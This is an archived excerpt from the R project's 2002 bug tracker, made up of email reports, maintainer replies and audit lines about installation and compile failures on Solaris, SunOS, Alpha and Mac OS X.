From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 17 Jan 2002 11:45:33 +0100
In-Reply-To: <200201170837.JAA23228@pubhealth.ku.dk>
Message-ID: <x2g055cl2q.fsf@blueberry.kubism.ku.dk>
Lines: 24
User-Agent: Gnus/5.0808 (Gnus v5.8.8) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

ripley@stats.ox.ac.uk writes:

> > Got the following error when compiling on Solaris 2.6 with the standard GNU
> > gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> > too :-)
> 
> You sent this twice, for some reason.
> 
> It's hard to tell what `the standard GNU gcc package (from the Sun site)'
> actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
> 2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
> between your compiler and your assembler.  I don't think that qualifies as
> a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
> seem to be valid C that is accepted by a wide range of compilers on
> Solaris and elsewhere.

Assuming that the "Sun site" means www.sunfreeware.com, I seem to
recall that you get in trouble if you use gcc3 without GNU binutils.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 1268.followup.2 <==
From geordon.marchak@nssmb.com  Mon Jan 21 09:27:58 2002
Received: from issaspam-ny01.ssmb.com (mail1.ssmb.COM [199.67.139.25])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA26346
	for <R-bugs@biostat.ku.dk>; Mon, 21 Jan 2002 09:27:56 +0100 (MET)
Received: from issny6.ny.ssmb.com (issny6.ny.ssmb.com [162.124.150.21])
	by issaspam-ny01.ssmb.com (8.12.0/8.12.0/SSMB_EXT/1.4) with ESMTP id g0L8QXbE027462;
	Mon, 21 Jan 2002 03:26:50 -0500 (EST)
Received: from mailhub.nssmb.com (mailhubb.nssmb.com [169.180.188.120])
	by issny6.ny.ssmb.com (8.11.0/8.11.0/SSMB_QQQ_IN/1.1) with ESMTP id g0L8PFT01212;
	Mon, 21 Jan 2002 03:25:15 -0500 (EST)
Received: from lx22z001.nssmb.com (lx22z001.nssmb.com [169.180.162.41])
	by mailhub.nssmb.com (8.9.3/8.9.3/SSMB-HUB) with ESMTP id RAA08319;
	Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Received: by lx22z001.nssmb.com (Postfix, from userid 81640)
	id 3B1E9BFE83; Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Received: from localhost (localhost [127.0.0.1])
	by lx22z001.nssmb.com (Postfix) with ESMTP
	id 0A901BFE82; Mon, 21 Jan 2002 17:25:14 +0900 (JST)
Date: Mon, 21 Jan 2002 17:25:13 +0900 (JST)
From: Joe Marchak <geordon.marchak@nssmb.com>
X-X-Sender:  <gm81640@lx22z001.nssmb.com>
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
Cc: <geordon.marchak@nssmb.com>, <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
In-Reply-To: <Pine.LNX.4.31.0201170827260.2465-100000@gannet.stats>
Message-ID: <Pine.LNX.4.33.0201211721260.8617-100000@lx22z001.nssmb.com>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


As you mentioned below, R 1.3.1 does compile on Solaris with gcc 2.95.  I've tried 
both Solaris 2.5.1 and Solaris 2.6 with this, and they are fine.  Moving to gcc 
3.03 however causes the problem.  

Thanks for you help earlier.

-Joe.



> Date: Thu, 17 Jan 2002 08:37:15 +0000 (GMT)
> From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
> To: geordon.marchak@nssmb.com
> Subject: Re: [Rd] Solaris 2.6 Compile (PR#1268)
> 
> On Thu, 17 Jan 2002 gm81640@development.nssmb.com wrote:
> 
> > Full_Name: Geordon Marchak
> > Version: R-1.3.1
> > OS: Solaris 2.6
> > Submission from: (NULL) (199.67.239.91)
> >
> >
> > Got the following error when compiling on Solaris 2.6 with the standard GNU
> > gcc package (from the Sun site).   BTW - linux compiles no problem (and fast
> > too :-)
> 
> You sent this twice, for some reason.
> 
> It's hard to tell what `the standard GNU gcc package (from the Sun site)'
> actually is.  However, R 1.3.1 did compile under Solaris 2.6 with gcc
> 2.95.3 compiled under Solaris 2.6.  The error appears to be a mismatch
> between your compiler and your assembler.  I don't think that qualifies as
> a bug in R, and definitely is one we can do nothing about.  lbfgsb.c does
> seem to be valid C that is accepted by a wide range of compilers on
> Solaris and elsewhere.
> 
> 
> > # make
> > `Makedeps' is up to date.
> > gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> > -DHAVE_CONFIG_H   -g -O2 -c lbfgsb.c -o lbfgsb.o
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: unknown opcode
> > ".subsection"
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12959: error: statement syntax
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: unknown opcode
> > ".previous"
> > /usr/ccs/bin/as: "/var/tmp/cccbNfee.s", line 12971: error: statement syntax
> > *** Error code 1
> > make: Fatal error: Command failed for target `lbfgsb.o'
> > Current working directory /home/gm81640/R-1.3.1/src/appl
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> > Current working directory /home/gm81640/R-1.3.1/src/appl
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> > Current working directory /home/gm81640/R-1.3.1/src
> > *** Error code 1
> > make: Fatal error: Command failed for target `R'
> >
> >
> > -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> > _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> 


==> 1268.audit <==
Fri Jan 18 09:06:39 2002	ripley	changed notes
Fri Jan 18 09:06:39 2002	ripley	foobar
Fri Jan 18 09:06:39 2002	ripley	moved from incoming to System-specific
Sun Apr 21 09:41:09 2002	ripley	moved from System-specific to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1291 *
Subject: Installation problem : SunOS
From: brendan_mcmahon@prusec.com
Date: Thu, 31 Jan 2002 18:00:55 +0100 (MET)
--looks like gcc compiled under different OS version.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1291 <==
From brendan_mcmahon@prusec.com  Thu Jan 31 18:00:56 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA07547
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 18:00:55 +0100 (MET)
Date: Thu, 31 Jan 2002 18:00:55 +0100 (MET)
From: brendan_mcmahon@prusec.com
Message-Id: <200201311700.SAA07547@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Installation problem : SunOS

Full_Name: Brendan McMahon
Version: 1.3
OS: SunOS
Submission from: (NULL) (12.42.50.51)



Probably just a configuration problem but ... fails to compile.
configure completed without a problem.
Any help appreciated!!

SunOS flexdev1 5.7 Generic_106541-11 sun4u sparc SUNW,Ultra-5_10

`Makedeps' is up to date.
gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
-DHAVE_CONFIG_H   -g -O2 -c arithmetic.c -o arithmetic.o
arithmetic.c:58: warning: `struct exception' declared inside parameter list
arithmetic.c:58: warning: its scope is only this definition or declaration,
arithmetic.c:58: warning: which is probably not what you want.
arithmetic.c: In function `matherr':
arithmetic.c:60: dereferencing pointer to incomplete type
arithmetic.c:61: `DOMAIN' undeclared (first use this function)
arithmetic.c:61: (Each undeclared identifier is reported only once
arithmetic.c:61: for each function it appears in.)
arithmetic.c:62: `SING' undeclared (first use this function)
arithmetic.c:65: `OVERFLOW' undeclared (first use this function)
arithmetic.c:68: `UNDERFLOW' undeclared (first use this function)
arithmetic.c:69: dereferencing pointer to incomplete type
arithmetic.c: In function `do_math1':
arithmetic.c:984: `acosh' undeclared (first use this function)
arithmetic.c:985: `asinh' undeclared (first use this function)
arithmetic.c:986: `atanh' undeclared (first use this function)
*** Error code 1
make: Fatal error: Command failed for target `arithmetic.o'
Current working directory /export/home/flexapp/R/R-1.3.0/src/main
*** Error code 1
make: Fatal error: Command failed for target `R'

==> 1291.followup.1 <==
From ripley@stats.ox.ac.uk  Thu Jan 31 18:46:28 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA07809
	for <R-bugs@biostat.ku.dk>; Thu, 31 Jan 2002 18:46:28 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id RAA10317;
	Thu, 31 Jan 2002 17:45:57 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g0VHjv312467;
	Thu, 31 Jan 2002 17:45:57 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Thu, 31 Jan 2002 17:45:57 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <brendan_mcmahon@prusec.com>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Installation problem : SunOS (PR#1291)
In-Reply-To: <200201311700.SAA07558@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201311742120.12426-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 31 Jan 2002 brendan_mcmahon@prusec.com wrote:

> Full_Name: Brendan McMahon
> Version: 1.3
> OS: SunOS
> Submission from: (NULL) (12.42.50.51)
>
>
>
> Probably just a configuration problem but ... fails to compile.
> configure completed without a problem.

We need to know your compiler system. This is I seem to remember a symptom
of using gcc made on SunOS 5.5 under 5.6/7, so if this is gcc, was it
built under 5.7?

BTW, R is now at 1.4.1, not 1.3.0.

> Any help appreciated!!
>
> SunOS flexdev1 5.7 Generic_106541-11 sun4u sparc SUNW,Ultra-5_10
>
> `Makedeps' is up to date.
> gcc -I. -I../../src/include -I../../src/include -I/usr/local/include
> -DHAVE_CONFIG_H   -g -O2 -c arithmetic.c -o arithmetic.o
> arithmetic.c:58: warning: `struct exception' declared inside parameter list
> arithmetic.c:58: warning: its scope is only this definition or declaration,
> arithmetic.c:58: warning: which is probably not what you want.
> arithmetic.c: In function `matherr':
> arithmetic.c:60: dereferencing pointer to incomplete type
> arithmetic.c:61: `DOMAIN' undeclared (first use this function)
> arithmetic.c:61: (Each undeclared identifier is reported only once
> arithmetic.c:61: for each function it appears in.)
> arithmetic.c:62: `SING' undeclared (first use this function)
> arithmetic.c:65: `OVERFLOW' undeclared (first use this function)
> arithmetic.c:68: `UNDERFLOW' undeclared (first use this function)
> arithmetic.c:69: dereferencing pointer to incomplete type
> arithmetic.c: In function `do_math1':
> arithmetic.c:984: `acosh' undeclared (first use this function)
> arithmetic.c:985: `asinh' undeclared (first use this function)
> arithmetic.c:986: `atanh' undeclared (first use this function)
> *** Error code 1
> make: Fatal error: Command failed for target `arithmetic.o'
> Current working directory /export/home/flexapp/R/R-1.3.0/src/main
> *** Error code 1
> make: Fatal error: Command failed for target `R'
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1291.audit <==
Fri Feb  1 21:53:20 2002	ripley	changed notes
Fri Feb  1 21:53:20 2002	ripley	foobar
Fri Feb  1 21:53:20 2002	ripley	moved from incoming to System-specific
Sun Apr 21 09:41:20 2002	ripley	moved from System-specific to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1500 *
Subject: configure script fails on comment in tkConfig.sh
From: Peter Kleiweg <kleiweg@let.rug.nl>
Date: Tue, 30 Apr 2002 16:41:51 +0200 (CEST)
--Looks like a conspiracy between a shell problem and an oddity in Tk 8.0 rather
--than an R problem. Good to know for the workaround though. The comment in
--TK_XINCLUDES has since disappeared, at least in Tk 8.3.3.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1500 <==
From postmaster@franz.stat.wisc.edu  Tue Apr 30 16:42:34 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA22070
	for <r-bugs@biostat.ku.dk>; Tue, 30 Apr 2002 16:42:33 +0200 (MET DST)
Received: from kleigh.nl (really [213.84.55.218]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m172YpF-000IYIC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 09:41:53 -0500 (CDT) 
Received: from kleigh.nl (kleigh [127.0.0.1])
	by kleigh.nl (8.12.0/8.12.0) with ESMTP id g3UEfpS7030242
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 16:41:51 +0200
Received: from localhost (peter@localhost)
	by kleigh.nl (8.12.0/8.12.0/Submit) with ESMTP id g3UEfpgv030239
	for <r-bugs@r-project.org>; Tue, 30 Apr 2002 16:41:51 +0200
X-Authentication-Warning: kleigh.nl: peter owned process doing -bs
Date: Tue, 30 Apr 2002 16:41:51 +0200 (CEST)
From: Peter Kleiweg <kleiweg@let.rug.nl>
X-X-Sender:  <kleiweg@kleigh.nl>
To: <r-bugs@r-project.org>
Subject: configure script fails on comment in tkConfig.sh
Message-ID: <Pine.LNX.4.33.0204301632320.29798-100000@kleigh.nl>
Organization: Alfa-Informatica, Rijksuniversiteit Groningen
X-Accept-Language: nl,en,ia,af,de,da,no,sv,fr,it
X-Alert: http://www.opensource.org/halloween/
X-Face: "K~X:~!ydgSdjNy;]_+BCb\OM^pqyg_q*Le84$l46M\-mL=.^,L4B}bDK>`o#r4_>O*
X-Mailer: Pine 4.33, Linux 2.0.36, i586
X-Reason: http://www.interlingua.com/
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


The configure script failed on tk on several platforms. One is
given below. This did not happen on versions of R older than 1.5.0.

Message from configure:

configure: WARNING: /opt_local/opt/tk-8.0/include/tk.h: accepted by the compiler, rejected by the preprocessor!
configure: WARNING: /opt_local/opt/tk-8.0/include/tk.h: proceeding with the preprocessor's result

This was in config.log, the command on a single line:

configure:21361: cc -E -I/opt_local/opt/readline/include
  -I/opt_local/opt/tk/include -I/opt_local/opt/tcl/include
  -I/opt_local/opt/jpeg6/inclu de -I/opt_local/opt/png/include
  -I/opt_local/opt/ncurses/include -I/opt_local/opt/zlib/include
  -I/opt_local/opt/R/include # no special path needed
  -I/opt_local/opt/tcl-8.0/include conftest.c
cc: warning 485: Can't open "#".
cc: warning 485: Can't open "no".
cc: warning 485: Can't open "special".
cc: warning 485: Can't open "path".
cc: warning 485: Can't open "needed".

I had to edit tkConfig.sh to solve this problem. This line:

TK_XINCLUDES='# no special path needed'

changed to this:

TK_XINCLUDES=


After this fix, R was configured for tcl/tk, and the package
tcltk seems to work OK (at least on this platform).



# Tk's version number.
TK_VERSION='8.3'
TK_MAJOR_VERSION='8'
TK_MINOR_VERSION='3'
TK_PATCH_LEVEL='.3'

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 5.0
 year = 2002
 month = 04
 day = 29
 language = R

Search Path:
 .GlobalEnv, package:tcltk, package:ctest, Autoloads, package:base



==> 1500.audit <==
Tue May  7 09:05:09 2002	ripley	moved from incoming to Installation
Mon Sep 16 12:45:53 2002	pd	changed notes
Mon Sep 16 12:45:53 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1658 *
Subject: make install fails - index.html not found
From: dhouston@bio.ri.ccf.org
Date: Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
--Missing perl??
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1658 <==
From dhouston@bio.ri.ccf.org  Tue Jun 11 22:14:08 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06194
	for <R-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
Date: Tue, 11 Jun 2002 22:14:07 +0200 (MET DST)
From: dhouston@bio.ri.ccf.org
Message-Id: <200206112014.WAA06194@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: make install fails - index.html not found

Full_Name: Dale Houston
Version: 1.5.0
OS: Solaris 8
Submission from: (NULL) (192.35.79.70)


I am trying to get RT-1.5.0 installed on Solaris 8.

The programs compile fine and 'make check' seems to work.

But when I do a 'make install' I see this:

/home/dhouston/R-1.5.0 grieg> make install
installing afm ...
installing doc ...
installing doc/html ...
install:  index.html does not exist
*** Error code 1
make: Fatal error: Command failed for target `install'
Current working directory /home/dhouston/R-1.5.0/doc/html
*** Error code 1
make: Fatal error: Command failed for target `install'
Current working directory /home/dhouston/R-1.5.0/doc
*** Error code 1
make: Fatal error: Command failed for target `install'

I do not see index.html in doc/html. I made a fake one for testing purposes, but
when I do a make install it now fails trying to find SearchEngine.html.

I did a 'make html' but to no avail.

dale


==> 1658.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jun 11 22:50:13 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA06330
	for <R-bugs@biostat.ku.dk>; Tue, 11 Jun 2002 22:50:13 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA09492;
	Tue, 11 Jun 2002 21:40:27 +0100 (BST)
Date: Tue, 11 Jun 2002 21:40:26 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <dhouston@bio.ri.ccf.org>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: make install fails - index.html not found (PR#1658)
In-Reply-To: <200206112014.WAA06199@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0206112136170.23760-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 11 Jun 2002 dhouston@bio.ri.ccf.org wrote:

> Full_Name: Dale Houston
> Version: 1.5.0
> OS: Solaris 8
> Submission from: (NULL) (192.35.79.70)
>
>
> I am trying to get RT-1.5.0 installed on Solaris 8.
>
> The programs compile fine and 'make check' seems to work.
>
> But when I do a 'make install' I see this:
>
> /home/dhouston/R-1.5.0 grieg> make install
> installing afm ...
> installing doc ...
> installing doc/html ...
> install:  index.html does not exist
> *** Error code 1
> make: Fatal error: Command failed for target `install'
> Current working directory /home/dhouston/R-1.5.0/doc/html
> *** Error code 1
> make: Fatal error: Command failed for target `install'
> Current working directory /home/dhouston/R-1.5.0/doc
> *** Error code 1
> make: Fatal error: Command failed for target `install'
>
> I do not see index.html in doc/html. I made a fake one for testing purposes, but
> when I do a make install it now fails trying to find SearchEngine.html.

Those should have been generated during the build, by the Makefile's in
doc/html and doc/html/search.

Do you perchance not have Perl installed?

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1658.audit <==
Wed Jun 12 17:37:16 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:27:14 2002	pd	changed notes
Mon Sep 16 13:27:14 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1676 *
Subject: R configure.in makes bad alpha assumptions
From: mcmahill@mtl.mit.edu
Date: Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
--Probably fixed in 1.5.1
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1676 <==
From postmaster@franz.stat.wisc.edu  Sun Jun 16 01:21:52 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA07423
	for <r-bugs@biostat.ku.dk>; Sun, 16 Jun 2002 01:21:51 +0200 (MET DST)
Received: from mtl.mit.edu (really [18.62.0.45]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17JMr0-000IWsC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Sat, 15 Jun 2002 18:21:10 -0500 (CDT) 
Received: from bitter.mit.edu (BITTER.MIT.EDU [18.62.6.13])
	by mtl.mit.edu (8.9.3/8.9.3) with SMTP id TAA27047
	for <r-bugs@r-project.org>; Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
Date: Sat, 15 Jun 2002 19:21:09 -0400 (EDT)
From: mcmahill@mtl.mit.edu
X-Sender: mcmahill@bitter.mit.edu
Reply-To: mcmahill@mtl.mit.edu
To: r-bugs@r-project.org
Subject: R configure.in makes bad alpha assumptions
Message-ID: <Pine.SOL.3.96.1020615185530.24629A-100000@bitter.mit.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Hi,

I was looking at configure.in for R-1.4.1 and in the
  case "${host_cpu}" in
part under alpha CPU's, the switch of -mieee for g77 and -fpe3 otherwise
is an OSF specific, not alpha specific issue.  In particular, if someone
used f2c-f77 (shell script which emulates a fortran compiler with f2c and
the c compiler), they'd get the broken -fpe3.  I'd probably either test
for OSF before adding -fpe3


-dan




==> 1676.followup.1 <==
From hornik@ci.tuwien.ac.at  Mon Jun 17 12:07:32 2002
Received: from isis.wu-wien.ac.at (isis.wu-wien.ac.at [137.208.3.42])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA12993
	for <R-bugs@biostat.ku.dk>; Mon, 17 Jun 2002 12:07:31 +0200 (MET DST)
Received: from mithrandir.hornik.net (mail@wu057056.wu-wien.ac.at [137.208.57.56])
	by isis.wu-wien.ac.at (8.8.7/8.8.7) with ESMTP id MAA58780emf hornik@ci.tuwien.ac.at; Mon, 17 Jun 2002 12:06:48 +0200
Received: from hornik by mithrandir.hornik.net with local (Exim 3.35 #1 (Debian))
	id 17JtNQ-0002x1-00; Mon, 17 Jun 2002 12:04:48 +0200
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15629.46143.876111.705355@mithrandir.hornik.net>
Date: Mon, 17 Jun 2002 12:04:47 +0200
To: mcmahill@mtl.mit.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: R configure.in makes bad alpha assumptions (PR#1676)
In-Reply-To: <200206152321.BAA07428@pubhealth.ku.dk>
References: <200206152321.BAA07428@pubhealth.ku.dk>
X-Mailer: VM 7.03 under Emacs 21.2.1
Reply-To: Kurt.Hornik@wu-wien.ac.at
From: Kurt Hornik <hornik@ci.tuwien.ac.at>

>>>>> mcmahill  writes:

> Hi,

> I was looking at configure.in for R-1.4.1 and in the
>   case "${host_cpu}" in
> part under alpha CPU's, the switch of -mieee for g77 and -fpe3 otherwise
> is an OSF specific, not alpha specific issue.  In particular, if someone
> used f2c-f77 (shell script which emulates a fortran compiler with f2c and
> the c compiler), they'd get the broken -fpe3.  I'd probably either test
> for OSF before adding -fpe3

This was changed for R 1.5.0, can you pls try with this?  (Or with 1.5.1
which will be released in a few moments ...)

-k

==> 1676.audit <==
Mon Jun 17 08:59:57 2002	ripley	moved from incoming to Installation
Mon Sep 16 13:28:22 2002	pd	changed notes
Mon Sep 16 13:28:22 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1825 *
Subject: bug in R-1.5.1 for Mac OS X installer
From: Kow Kuroda <kkuroda@crl.ucsd.edu>
Date: Mon, 22 Jul 2002 16:40:26 -0700
--Darwin port
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1825 <==
From kkuroda@crl.ucsd.edu  Tue Jul 23 01:41:08 2002
Received: from crl.ucsd.edu (IDENT:aiWcq1mpuPqEcBBe3VcCOXyB0AbCmN04@crl.ucsd.edu [132.239.63.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA05210
	for <r-bugs@biostat.ku.dk>; Tue, 23 Jul 2002 01:41:07 +0200 (MET DST)
Received: from crl-25.ucsd.edu (crl-25.ucsd.edu [132.239.63.25])
	by crl.ucsd.edu (8.11.6/8.11.6) with ESMTP id g6MNePr09771
	for <r-bugs@biostat.ku.dk>; Mon, 22 Jul 2002 16:40:25 -0700
Date: Mon, 22 Jul 2002 16:40:26 -0700
Mime-Version: 1.0 (Apple Message framework v482)
Content-Type: text/plain; charset=US-ASCII; format=flowed
Subject: bug in R-1.5.1 for Mac OS X installer
From: Kow Kuroda <kkuroda@crl.ucsd.edu>
To: r-bugs@biostat.ku.dk
Content-Transfer-Encoding: 7bit
Message-Id: <6612E904-9DCC-11D6-8F01-00050287C0A6@crl.ucsd.edu>
X-Mailer: Apple Mail (2.482)

Hi,

Thanks for developing an outstanding software for free. I admire all your 
effort greatly. I would like to submit a bug report on the R-1.5.1 
installer (in .mpkg, .pkg format) for Mac OS X.

I'm using fink in conjunction with Darwin. In my environment, /usr/local is 
symbolically linked to /sw which is fink's main directory. This is to 
conform the directory structure on my machine to the standard UNIX/Linux 
one.

It turned out that R-1.5.1 installer ignores the symbolic link and creates 
new /usr/local/bin and /usr/local/lib directories on their own, thereby 
installing all its stuff into them. This is really annoying. (Actually, 
after installing R, bash stopped running. At first, I couldn't figure out 
at all what happened. It turned out that bash failed to runs because it 
lost access dynamic libraries in /usr/local/lib directory.)

I hope the installer properly follows symbolic links during installation.

Cheers,
Kow


==> 1825.audit <==
Wed Jul 24 08:41:23 2002	ripley	changed notes
Wed Jul 24 08:41:23 2002	ripley	foobar
Wed Jul 24 08:41:23 2002	ripley	moved from incoming to Installation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1829 *
Subject: R config failure on solaris
From: "Siva Ginjupalli" <gsivrao@hotmail.com>
Date: Wed, 24 Jul 2002 20:08:49 +0000
--Missing info on R version and compilers.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1829 <==
From postmaster@franz.stat.wisc.edu  Wed Jul 24 22:09:46 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA15079
	for <r-bugs@biostat.ku.dk>; Wed, 24 Jul 2002 22:09:45 +0200 (MET DST)
Received: from hotmail.com (really [216.33.237.9]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17XSRV-000IWqC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 24 Jul 2002 15:09:05 -0500 (CDT) 
Received: from mail pickup service by hotmail.com with Microsoft SMTPSVC;
	 Wed, 24 Jul 2002 13:08:49 -0700
Received: from 66.12.38.242 by lw7fd.law7.hotmail.msn.com with HTTP;
	Wed, 24 Jul 2002 20:08:49 GMT
X-Originating-IP: [66.12.38.242]
From: "Siva Ginjupalli" <gsivrao@hotmail.com>
To: r-bugs@r-project.org
Subject: R config failure on solaris
Date: Wed, 24 Jul 2002 20:08:49 +0000
Mime-Version: 1.0
Content-Type: text/plain; format=flowed
Message-ID: <F9NUyKhy7uQP5F1iVbC00014ae6@hotmail.com>
X-OriginalArrivalTime: 24 Jul 2002 20:08:49.0356 (UTC) FILETIME=[EC86F0C0:01C2334D]

Dear sir,

This is siva Ginjupalli.

I am getting following error while configuring my Solaris for "R" software.

checking size of int... configure: error: cannot compute sizeof (int), 77.

My solaris information as follows:

uname -m = sun4u
uname -r = 5.8
uname -s = SunOS
uname -v = Generic_108528-01

/usr/bin/uname -p = sparc
/bin/uname -X     = System = SunOS
Release = 5.8
KernelID = Generic_108528-01
Machine = sun4u
BusType = <unknown>
Serial = <unknown>
Users = <unknown>
OEM# = 0
Origin# = 1
NumCPU = 2

I really appreciate if you could guide me to resolve this problem.

Please let me know, if you need config.log file to debug

Thanks
Siva

_________________________________________________________________
MSN Photos is the easiest way to share and print your photos: 
http://photos.msn.com/support/worldwide.aspx


==> 1829.audit <==
Tue Jul 30 11:53:41 2002	ripley	foobar
